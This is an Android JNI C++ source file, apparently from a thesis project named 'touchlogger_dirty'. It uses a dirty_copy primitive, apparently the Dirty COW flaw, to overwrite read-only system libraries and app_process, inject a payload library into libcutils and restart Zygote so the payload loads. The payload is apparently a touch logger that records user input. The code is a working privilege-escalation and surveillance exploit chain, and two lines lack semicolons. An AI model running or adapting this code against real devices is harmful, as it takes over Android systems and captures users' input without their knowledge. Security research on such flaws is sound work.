#include <jni.h>
#include <string>
#include <stdlib.h>
#include <unistd.h>

#include "dirty/file_utils/file_utils.h"
#include "dirty/lib_utils/inject.h"
#include "dirty/file_utils/dirty_copy.h"
#include "dirty/common/logging.h"

#ifdef __aarch64__
#define APP_PROCESS_PATH "/system/bin/app_process64"
#else
#define APP_PROCESS_PATH "/system/bin/app_process32"
#endif

#define LIBCUTILS_PATH "/system/lib/libcutils.so"
#define LIBMTP_PATH "/system/lib/libmtp.so"
#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"

// TODO: make this depend on build type
#define DEBUG 1

char app_process_backup_path[PATH_MAX];
char libcutils_backup_path[PATH_MAX];
char libmtp_backup_path[PATH_MAX];
char shared_payload_path[PATH_MAX];
char exec_payload_path[PATH_MAX];

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepare(JNIEnv* env, jclass type,
                                                               jstring localPath_)
{
  const char* localPath = env->GetStringUTFChars(localPath_, 0);

  snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
  snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
  snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
  snprintf(shared_payload_path, PATH_MAX, "%s/%s", localPath, "libshared_payload.so");
  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, "exec_payload");

  LOGV("Backup libmtp...");
  if (copy_file_with_mode(LIBMTP_PATH, libmtp_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!");

  LOGV("Backup libcutils...");
  if (copy_file_with_mode(LIBCUTILS_PATH, libcutils_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!");

  LOGV("Backup app_process...");
  if (copy_file_with_mode(APP_PROCESS_PATH, app_process_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!");

  LOGV("Move exec_payload to external memory...");
  if (copy_file(exec_payload_path, EXEC_PAYLOAD_SDCARD_PATH) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!");

  LOGV("Replace libmtp...");
  if (dirty_copy(shared_payload_path, LIBMTP_PATH) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!")

  LOGV("Inject dependency into libcutils...")
  if (inject_dependency_into_library(LIBCUTILS_PATH, "libmtp.so") == -1)
  {
    LOGV("Failed!");
    LOGV("Temporary fix for test device...");
    LOGV("Please report if you see this in production version!");
    // FIXME: Temp fix for my Nexus 5, remove before production code!
    if (replace_dependency_in_binary(LIBCUTILS_PATH, "libcutils.so", "libmtp.so") == -1)
    {
      LOGV("Failed!");
      return (jboolean) false;
    }
  }
  LOGV("Done!");

  env->ReleaseStringUTFChars(localPath_, localPath);

  return (jboolean) true;
}

extern "C"
JNIEXPORT void JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env, jclass type)
{
  if (fork() == 0)
  {
    if (daemon(0, 0) == -1)
    {
      LOGV("Unable to daemonize process: %s!", strerror(errno));
    }
    else
    {
      LOGV("Start as daemon!");
    }

    int killer_pid;
    if ((killer_pid = fork()) == 0)
    {
      if (dirty_copy(shared_payload_path, APP_PROCESS_PATH) == -1)
      {
        LOGV("Unable to overwrite app_process (%s) with %s!", APP_PROCESS_PATH,
             shared_payload_path);
        exit(-1);
      }
      else
      {
        LOGV("App_process successfully overwritten!");
      }

      exit(0);
    }

    //FIXME: come up with something less dumb than that
    sleep(10);

    LOGV("Zygote is probably dead now");

    if (kill(killer_pid, SIGKILL) == -1)
    {
      LOGV("Unable to kill killer thread: %s", strerror(errno));
    }
    else
    {
      LOGV("Killer process killed successfully!");
    }

    if (dirty_copy(app_process_backup_path, APP_PROCESS_PATH) == -1)
    {
      LOGV("Unable to restore app_process from backup! Reboot yor device and try again.");
      exit(-1);
    }
    else
    {
      LOGV("Zygote successfully restarted!");
    }

    sleep(10);

    LOGV("Return everything to initial state");

    if (!(killer_pid = fork()))
    {
      dirty_copy(shared_payload_path, APP_PROCESS_PATH);
      exit(0);
    }
    else
    {
      sleep(5);
    }

    LOGV("Wait for it...");
    sleep(5);

    kill(killer_pid, SIGKILL);
    LOGV("Done! About to resurrect it");

    dirty_copy(libmtp_backup_path, LIBMTP_PATH);
    dirty_copy(libcutils_backup_path, LIBCUTILS_PATH);
    dirty_copy(app_process_backup_path, APP_PROCESS_PATH);
    LOGV("Done!");

    exit(0);
  }
}

extern "C"
JNIEXPORT jstring JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_stringFromJNI(JNIEnv* env,
                                                                     jobject instance)
{
  std::string hello = "Hello from C++";
  return env->NewStringUTF(hello.c_str());
}
